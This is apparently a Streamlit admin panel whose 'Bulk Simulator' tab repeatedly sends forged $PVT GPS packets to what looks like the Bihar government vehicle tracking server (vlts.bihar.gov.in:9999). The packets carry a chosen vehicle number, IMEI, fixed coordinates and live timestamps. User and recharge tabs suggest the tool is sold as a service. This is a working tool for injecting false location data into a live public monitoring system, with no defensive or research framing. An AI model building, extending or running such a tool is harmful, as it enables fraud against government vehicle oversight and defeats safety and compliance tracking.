import streamlit as st
import pandas as pd
import time
import socket
import random
from datetime import datetime
from database import supabase, get_tags

# --- SETTINGS ---
HOST_URL = "vlts.bihar.gov.in"
PORT = 9999

def send_vlts_raw(host, port, raw_packet):
    try:
        # ⚠️ YAHAN DEKH: BILKUL BHI SPACE NAHI HAI \r\n MEIN
        final_to_send = raw_packet.strip() + "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        s.sendall(final_to_send.encode('ascii'))
        s.close()
        return True
    except:
        return False

def admin_panel():
    st.sidebar.markdown("<h2 style='color: #FF4B4B;'>👑 Admin Pro Max</h2>", unsafe_allow_html=True)
    if st.sidebar.button("🔒 Logout Admin"):
        st.session_state.logged_in = False
        st.rerun()
    
    t1, t2, t3, t4, t5 = st.tabs(["📊 Reports", "🚀 Bulk Simulator", "🏷️ Tag Manager", "👤 User Control", "💳 Recharges"])
    
    # --- TAB 1: REPORTS ---
    with t1:
        st.subheader("📊 Live Activity Reports")
        if st.button("🔄 Refresh Logs"):
            st.rerun()
        try:
            # Database se seedha data uthana
            res = supabase.table("activity_logs").select("*").order("created_at", desc=True).limit(30).execute()
            if res.data:
                st.table(pd.DataFrame(res.data))
            else:
                st.warning("Reports table is empty.")
        except Exception as e:
            st.error(f"DB Error: {e}")

    # --- TAB 2: BULK SIMULATOR (TERA ASLI CODE) ---
    with t2:
        st.subheader("🛰️ Bihar VLTS Bulk Simulator")
        c1, c2, c3 = st.columns(3)
        v_no = c1.text_input("Vehicle No", "BR04GA5974").upper().strip()
        i_no = c2.text_input("IMEI No", "862567075041793").strip()
        gap = c3.slider("Gap", 0.1, 5.0, 1.0)
        
        all_db_tags = get_tags()
        suffix = "0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041"
        
        if 'injecting' not in st.session_state: 
            st.session_state.injecting = False

        if not st.session_state.injecting:
            if st.button("🚀 START TRANSMISSION", type="primary"):
                st.session_state.injecting = True
                st.rerun()
        else:
            if st.button("🛑 STOP"):
                st.session_state.injecting = False
                st.rerun()
            
            status = st.empty()
            while st.session_state.injecting:
                t_now = datetime.now().strftime("%H%M%S")
                d_now = datetime.now().strftime("%d%m%Y")
                
                # --- DATABASE LOGGING (Reports ke liye) ---
                try:
                    supabase.table("activity_logs").insert({
                        "vehicle_no": f"SIM: {v_no}",
                        "created_at": datetime.now().isoformat()
                    }).execute()
                except:
                    pass

                # --- PACKET SENDING ---
                for tag in all_db_tags:
                    # TERA EXACT STRING FORMAT
                    packet = f"$PVT,{tag},2.1.1,NR,01,L,{i_no},{v_no},1,{d_now},{t_now},25.6501550,N,84.7851780,E,{suffix},DDE3*"
                    send_vlts_raw(HOST_URL, PORT, packet)
                
                status.success(f"Sent {len(all_db_tags)} tags at {t_now}")
                time.sleep(gap)
